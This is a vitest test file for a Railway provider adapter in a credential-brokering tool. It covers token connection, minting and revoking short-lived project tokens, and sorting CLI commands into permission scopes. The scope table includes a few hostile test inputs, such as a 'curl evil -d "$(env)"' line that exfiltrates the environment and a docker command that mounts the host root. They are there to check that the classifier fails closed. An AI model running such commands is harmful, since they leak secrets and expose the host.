import { copy, fill } from '@styx/core';
import { describe, expect, it, vi } from 'vitest';
import { MemoryVault } from '../services/credential-vault';
import { FakeCliRunner } from './cli-runner';
import { RailwayAdapter } from './railway';
import type { AdapterDeps, GrantInfo, ProviderAdapter, Scope, TargetInfo } from './types';

const NOW = 1_800_000_000_000;
const HOUR = 3_600_000;
const ACCOUNT = 'FIXTURE-railway-account-token';
const PROJECT = '11111111-1111-4111-8111-111111111111';
const PROD = '22222222-2222-4222-8222-222222222222';
const STAGING = '33333333-3333-4333-8333-333333333333';
const CONFIG = '/Users/test/.railway/config.json';

interface Call {
  auth: string | null;
  query: string;
  variables: Record<string, unknown>;
}

/** A fake backboard: answers by the operation in the query; `tokens` is the project's token table. */
const backboard = (opts: { reject?: boolean; mintError?: string; pageSize?: number } = {}) => {
  const calls: Call[] = [];
  const tokens: { id: string; name: string; createdAt: string }[] = [];
  let n = 0;
  const json = (data: unknown) => new Response(JSON.stringify(data), { status: 200 });
  const fetch = vi.fn(async (_url: string | URL | Request, init?: RequestInit) => {
    const body = JSON.parse(String(init?.body)) as { query: string; variables: Record<string, unknown> };
    const auth = new Headers(init?.headers).get('authorization');
    calls.push({ auth, ...body });
    if (opts.reject) return new Response('{"errors":[{"message":"Not Authorized"}]}', { status: 401 });
    const q = body.query;
    if (q.includes('projects(first'))
      return json({
        data: {
          projects: {
            edges: [
              {
                node: {
                  id: PROJECT,
                  name: 'acme-shop',
                  environments: {
                    edges: [
                      { node: { id: PROD, name: 'production' } },
                      { node: { id: STAGING, name: 'staging' } },
                    ],
                  },
                },
              },
            ],
          },
        },
      });
    if (q.includes('environment(id'))
      return json({
        data: {
          environment: {
            id: body.variables['id'],
            name: body.variables['id'] === PROD ? 'production' : 'staging',
            projectId: PROJECT,
          },
        },
      });
    if (q.includes('me {')) return json({ data: { me: { email: 'nic@acme.dev', name: 'Nic' } } });
    if (q.includes('projectTokenCreate')) {
      if (opts.mintError) return json({ errors: [{ message: opts.mintError }] });
      n += 1;
      const input = body.variables['input'] as { name: string };
      tokens.push({ id: `tok-${n}`, name: input.name, createdAt: new Date(NOW).toISOString() });
      return json({ data: { projectTokenCreate: `FIXTURE-project-token-${n}` } });
    }
    if (q.includes('projectTokens(')) {
      // Paged like the real connection: `after` is the index cursor of the last row returned.
      const size = opts.pageSize ?? 100;
      const from = typeof body.variables['after'] === 'string' ? Number(body.variables['after']) : 0;
      const page = tokens.slice(from, from + size);
      const more = from + size < tokens.length;
      return json({
        data: {
          projectTokens: {
            edges: page.map((node) => ({ node })),
            pageInfo: { hasNextPage: more, endCursor: more ? String(from + size) : null },
          },
        },
      });
    }
    if (q.includes('projectTokenDelete')) {
      const i = tokens.findIndex((t) => t.id === body.variables['id']);
      if (i >= 0) tokens.splice(i, 1);
      return json({ data: { projectTokenDelete: true } });
    }
    return new Response('unknown', { status: 400 });
  });
  return { calls, tokens, fetch: fetch as unknown as typeof globalThis.fetch };
};

const setup = (opts: Parameters<typeof backboard>[0] = {}, cli = new FakeCliRunner()) => {
  const api = backboard(opts);
  const deps: AdapterDeps = { vault: new MemoryVault(), cli, now: () => NOW, fetch: api.fetch };
  return { api, deps, cli, railway: new RailwayAdapter(deps) };
};
const target = (over: Partial<TargetInfo>): TargetInfo => ({
  id: 't1',
  provider: 'railway',
  name: 'Railway',
  env: 'prod',
  config: { environmentId: PROD },
  credentialRef: 'styx:v1:railway:t1:oauth',
  ...over,
});
const grant = (scope: Scope[], over: Partial<GrantInfo> = {}): GrantInfo => ({
  id: 'g1',
  scope,
  duration: '1h',
  expiresAt: NOW + HOUR,
  ...over,
});
const withToken = async (deps: AdapterDeps) =>
  deps.vault.set('styx:v1:railway:t1:oauth', JSON.stringify({ token: ACCOUNT }));

describe('RailwayAdapter: connect', () => {
  it('token mode lists project · environment pairs, needs a pick, and stores the token only in the vault', async () => {
    const { railway, deps, api } = setup();
    await expect(railway.connect({ method: 'token', token: ACCOUNT }, 't1')).rejects.toThrow(
      fill(copy.connect.project.choose, { provider: 'Railway' }),
    );
    expect(await railway.listProjects({ kind: 'token', token: ACCOUNT })).toEqual([
      { id: PROD, name: 'acme-shop · production', region: null },
      { id: STAGING, name: 'acme-shop · staging', region: null },
    ]);
    const c = await railway.connect(
      { method: 'token', token: ACCOUNT, config: { environmentId: STAGING } },
      't1',
    );
    expect(c.credentialRef).toBe('styx:v1:railway:t1:oauth');
    expect(JSON.parse((await deps.vault.get(c.credentialRef)) ?? '')).toEqual({ token: ACCOUNT });
    expect(c.config).toEqual({ environmentId: STAGING, account: 'nic@acme.dev' });
    expect(api.calls.every((x) => x.auth === `Bearer ${ACCOUNT}`)).toBe(true);
  });

  it('cli mode reads the CLI login on every use and stores only the account', async () => {
    const cli = new FakeCliRunner()
      .install('railway')
      .file(CONFIG, JSON.stringify({ user: { token: 'FIXTURE-cli-legacy' } }));
    const { railway, deps, api } = setup({}, cli);
    const c = await railway.connect({ method: 'cli', account: 'cli', config: { environmentId: PROD } }, 't1');
    expect(c.credentialRef).toBe('styx:v1:railway:t1:cli');
    expect(JSON.parse((await deps.vault.get(c.credentialRef)) ?? '')).toEqual({
      kind: 'cli',
      account: 'cli',
    });
    expect(api.calls.at(-1)?.auth).toBe('Bearer FIXTURE-cli-legacy');
    // The OAuth login wins over the legacy token, and a re-login is picked up without reconnecting.
    cli.file(
      CONFIG,
      JSON.stringify({ user: { accessToken: 'FIXTURE-cli-oauth', tokenExpiresAt: NOW / 1000 + 3600 } }),
    );
    await railway.test(target({ credentialRef: c.credentialRef }));
    expect(api.calls.at(-1)?.auth).toBe('Bearer FIXTURE-cli-oauth');
  });

  it('cli mode: no login, or an expired one the CLI cannot refresh, is an expiry', async () => {
    const cli = new FakeCliRunner()
      .install('railway')
      .on('railway', ['whoami'], { stdout: 'Logged in as Nic' });
    const { railway, deps } = setup({}, cli);
    await deps.vault.set('styx:v1:railway:t1:cli', JSON.stringify({ kind: 'cli', account: 'cli' }));
    const t = target({ credentialRef: 'styx:v1:railway:t1:cli' });
    expect(await railway.health(t)).toMatchObject({ ok: false, expired: true });
    cli.file(
      CONFIG,
      JSON.stringify({ user: { accessToken: 'FIXTURE-old', tokenExpiresAt: NOW / 1000 - 10 } }),
    );
    expect(await railway.health(t)).toMatchObject({ ok: false, expired: true });
    // `railway whoami` refreshed it.
    cli.file(
      CONFIG,
      JSON.stringify({ user: { accessToken: 'FIXTURE-new', tokenExpiresAt: NOW / 1000 + 3600 } }),
    );
    expect(await railway.health(t)).toEqual({ ok: true, identity: 'acme-shop · production' });
  });

  it('health: a 401 is an expiry; an unchosen environment is not', async () => {
    const { railway, deps } = setup();
    await withToken(deps);
    expect(await railway.health(target({ config: {} }))).toMatchObject({ ok: false, expired: false });
    const rejected = setup({ reject: true });
    await withToken(rejected.deps);
    expect(await rejected.railway.health(target({}))).toMatchObject({ ok: false, expired: true });
  });
});

describe('RailwayAdapter: issue and revoke', () => {
  it('mints a project token for the target’s environment, hands it over as RAILWAY_TOKEN, deletes it on revoke', async () => {
    const { railway, deps, api } = setup();
    await withToken(deps);
    const issued = await railway.issue(grant(['deploy']), target({}));
    expect(issued).toEqual({
      kind: 'env',
      env: { RAILWAY_TOKEN: 'FIXTURE-project-token-1' },
      expiresAt: NOW + HOUR,
      scoped: false,
      handle: `railway:styx-g1-${NOW}`,
    });
    expect(api.calls.find((c) => c.query.includes('projectTokenCreate'))?.variables).toEqual({
      input: { projectId: PROJECT, environmentId: PROD, name: `styx-g1-${NOW}` },
    });
    expect(api.tokens).toHaveLength(1);
    await railway.revoke(issued);
    expect(api.tokens).toEqual([]);
    // A second revoke, or one for something Styx did not mint, touches nothing.
    const before = api.calls.length;
    await railway.revoke(issued);
    await railway.revoke({ kind: 'env', env: {}, expiresAt: null, scoped: false });
    expect(api.calls.length).toBe(before);
  });

  it('Railway tokens never expire on their own: always/session grants are re-minted hourly', async () => {
    const { railway, deps } = setup();
    await withToken(deps);
    const issued = await railway.issue(grant(['write'], { duration: 'always', expiresAt: null }), target({}));
    expect(issued.expiresAt).toBe(NOW + HOUR);
  });

  it('sweeps only Styx-minted tokens older than two hours, across pages, on issue and on a healthy check', async () => {
    const { railway, deps, api } = setup({ pageSize: 2 });
    await withToken(deps);
    const old = new Date(NOW - 3 * HOUR).toISOString();
    const ulid = (c: string) => c.repeat(26);
    const seed = () =>
      api.tokens.push(
        { id: 'theirs', name: 'ci-deploy', createdAt: old },
        { id: 'look-alike', name: 'styx-ci', createdAt: old }, // a user's own token named like ours
        {
          id: 'recent',
          name: `styx-${ulid('B')}-${NOW - 600_000}`,
          createdAt: new Date(NOW - 600_000).toISOString(),
        },
        { id: 'stale', name: `styx-${ulid('A')}-${NOW - 3 * HOUR}`, createdAt: old }, // on the second page
      );
    seed();
    await railway.issue(grant(['write']), target({}));
    expect(api.tokens.map((t) => t.id).sort()).toEqual(['look-alike', 'recent', 'theirs', 'tok-1']);
    api.tokens.length = 0;
    seed();
    expect(await railway.health(target({}))).toMatchObject({ ok: true });
    expect(api.tokens.map((t) => t.id).sort()).toEqual(['look-alike', 'recent', 'theirs']);
  });

  it('revoke still deletes the token after the target’s keychain entry is gone (target removed or reconnected)', async () => {
    const { railway, deps, api } = setup();
    await withToken(deps);
    const issued = await railway.issue(grant(['write']), target({}));
    await deps.vault.delete('styx:v1:railway:t1:oauth');
    await railway.revoke(issued);
    expect(api.tokens).toEqual([]);
  });

  it('an idle token past its hour is deleted at the next health check, not left alive with its grant', async () => {
    const { deps, api } = setup();
    let now = NOW;
    const railway = new RailwayAdapter({ ...deps, now: () => now });
    await withToken(deps);
    await railway.issue(grant(['write'], { duration: 'always', expiresAt: null }), target({}));
    expect(api.tokens).toHaveLength(1);
    now = NOW + HOUR / 2;
    await railway.health(target({}));
    expect(api.tokens).toHaveLength(1); // still within its hour
    now = NOW + HOUR + 1;
    await railway.health(target({}));
    expect(api.tokens).toEqual([]);
  });

  it('caps every token at an hour even when a session grant runs longer', async () => {
    const { railway, deps } = setup();
    await withToken(deps);
    const issued = await railway.issue(
      grant(['write'], { duration: 'session', expiresAt: NOW + 8 * HOUR }),
      target({}),
    );
    expect(issued.expiresAt).toBe(NOW + HOUR);
  });

  it('a staging target on the production environment still mints (row 164: warn, never refuse); a refused mint throws', async () => {
    const { railway, deps } = setup();
    await withToken(deps);
    await expect(railway.issue(grant(['read']), target({ env: 'staging' }))).resolves.toMatchObject({
      kind: 'env',
    });
    await expect(
      railway.issue(grant(['read']), target({ env: 'staging', config: { environmentId: STAGING } })),
    ).resolves.toMatchObject({ kind: 'env' });
    await expect(railway.issue(grant(['read']), target({ config: {} }))).rejects.toThrow(/several projects/);
    const refused = setup({ mintError: 'Not Authorized' });
    await withToken(refused.deps);
    await expect(refused.railway.issue(grant(['write']), target({}))).rejects.toThrow(/rejected the token/);
    const other = setup({ mintError: 'Problem processing request: token secret abc' });
    await withToken(other.deps);
    // Railway's own error text is never echoed (it reaches audit detail and banners).
    await expect(other.railway.issue(grant(['write']), target({}))).rejects.toThrow(
      /^Railway refused the request$/,
    );
  });

  it('is never scoped: a project token can do anything in its environment', () => {
    const { railway } = setup();
    expect(('issuesScoped' satisfies keyof ProviderAdapter) in railway).toBe(false);
  });
});

describe('RailwayAdapter: status, deploy, environments', () => {
  it('cliStatus reads the account from `railway whoami` and the login from the config file', async () => {
    const cli = new FakeCliRunner()
      .install('railway')
      .on('railway', ['--version'], { stdout: 'railway 4.10.0' })
      .on('railway', ['whoami'], { stdout: 'Logged in as Nic (nic@acme.dev) 👋' })
      .file(CONFIG, JSON.stringify({ user: { token: 'FIXTURE' } }));
    const { railway } = setup({}, cli);
    expect(await railway.cliStatus()).toEqual({
      installed: true,
      binary: '/usr/local/bin/railway',
      version: '4.10.0',
      loginCommand: 'railway login',
      accounts: [{ id: 'cli', label: 'nic@acme.dev', active: true }],
    });
    cli.files.clear();
    expect((await railway.cliStatus()).accounts).toEqual([]);
    expect(await setup().railway.cliStatus()).toMatchObject({ installed: false });
    expect(railway.cliLoginCommand()).toEqual({ bin: 'railway', args: ['login'] });
  });

  it('deployCommand is `railway up --ci`, with the target’s service when it names one', () => {
    const { railway } = setup();
    expect(railway.deployCommand(target({}))).toEqual({ bin: 'railway', args: ['up', '--ci'] });
    expect(railway.deployCommand(target({ config: { service: 'web' } }))).toEqual({
      bin: 'railway',
      args: ['up', '--ci', '--service', 'web'],
    });
  });

  it.each<[string[], 'prod' | 'non-prod' | null]>([
    [['up', '-e', 'production'], 'prod'],
    [['up', '--environment=Production'], 'prod'],
    [['variables', '--environment', 'prod'], 'prod'],
    [['up', '-e', 'staging'], 'non-prod'],
    [['up', '-estaging'], 'non-prod'],
    [['up', '-e=production'], 'prod'],
    [['up', '-e', 'prod-eu'], 'prod'],
    [['up', '-e', 'preprod'], 'non-prod'],
    [['up'], null],
    [['up', '-e'], null],
  ])('envOfCommand %j → %s', (argv, env) => {
    expect(setup().railway.envOfCommand(argv)).toBe(env);
  });
});

describe('RailwayAdapter: scope classification', () => {
  const { railway } = setup();
  it.each<[string[], Scope]>([
    // delete
    [['delete'], 'delete'],
    [['delete', '--yes'], 'delete'],
    [['down'], 'delete'],
    [['environment', 'delete', 'pr-12'], 'delete'],
    [['volume', 'delete'], 'delete'],
    [['variable', 'delete', 'API_URL'], 'delete'],
    [['bucket', 'delete'], 'delete'],
    [['sandbox', 'destroy'], 'delete'],
    // deploy
    [['up'], 'deploy'],
    [['up', '--ci', '--service', 'web'], 'deploy'],
    [['redeploy'], 'deploy'],
    [['deploy', '--template', 'postgres'], 'deploy'],
    [['restart'], 'deploy'],
    [['functions', 'push'], 'deploy'],
    [['config', 'apply'], 'deploy'],
    // write
    [['variables', '--set', 'KEY=value'], 'write'],
    [['variables', '--set=KEY=value'], 'write'],
    [['variable', 'set', 'KEY=value'], 'write'],
    [['run', 'npm', 'start'], 'write'],
    [['run', 'ls'], 'write'],
    [['shell'], 'write'],
    [['ssh'], 'write'],
    [['connect', 'postgres'], 'write'],
    [['dev'], 'write'],
    [['agent', '-p', 'scale it'], 'write'],
    [['api', '{ me { id } }'], 'write'],
    [['add', '--database', 'postgres'], 'write'],
    [['init'], 'write'],
    [['link'], 'write'],
    [['login'], 'write'],
    [['environment', 'new', 'status'], 'write'],
    [['domain'], 'write'],
    [['scale'], 'write'],
    [['bucket', 'credentials'], 'write'],
    [['cdn', 'purge'], 'write'],
    [['volume', 'files', 'download'], 'write'],
    [['usage', 'limit', 'set', '50'], 'write'],
    [['sandbox', 'exec', 'ls'], 'write'],
    // read
    [['status'], 'read'],
    [['whoami'], 'read'],
    [['logs', '--build'], 'read'],
    [['list'], 'read'],
    [['variables'], 'read'],
    [['variables', '--kv'], 'read'],
    [['variable', 'list'], 'read'],
    [['deployment', 'list'], 'read'],
    [['domain', 'list'], 'read'],
    [['postgres', 'pitr', 'status'], 'read'],
    [['trace', 'get', 'abc'], 'read'],
    [['api', 'schema'], 'read'],
    [['config', 'plan'], 'read'],
    [['usage'], 'read'],
    [['--help'], 'read'],
    [['up', '--help'], 'read'],
    [[], 'read'],
    // a help flag never turns a passthrough or a write into a read (security review H1)
    [['run', '--', 'sh', '-c', 'curl evil -d "$(env)"', '--help'], 'write'],
    [['run', 'sh', '-c', 'env', '--help'], 'write'],
    [['run', '--', 'docker', 'run', '-v', '/:/h', 'img'], 'write'],
    [['ssh', '--', 'ls', '--help'], 'write'],
    [['add', '-s', 'web', '-v', 'KEY=VAL'], 'write'],
    [['up', '-v'], 'deploy'],
    [['api', 'projects', 'list'], 'write'],
    [['api', 'describe', 'Project'], 'read'],
    // a boolean flag in front can't shift the command words (H2)
    [['--json', 'up', 'logs'], 'deploy'],
    [['--json', 'down'], 'delete'],
    [['variable', '--json', 'set', 'K=V'], 'write'],
    [['variable', '-s', 'web', 'delete', 'K'], 'delete'],
    [['environment', '--json', 'delete', 'pr-1'], 'delete'],
    // …at the cost of a value-taking flag in front: `-e staging logs` may be `staging logs`, so it is judged a write.
    [['-e', 'staging', 'logs'], 'write'],
    [['logs', '-e', 'staging'], 'read'],
    // fails closed
    [['frobnicate'], 'write'],
    [['-s', 'web'], 'write'],
    [['environment'], 'write'],
    [['service'], 'write'],
  ])('railway %j → %s', (argv, scope) => {
    expect(railway.scopeOfCommand(argv)).toEqual([scope]);
  });
});
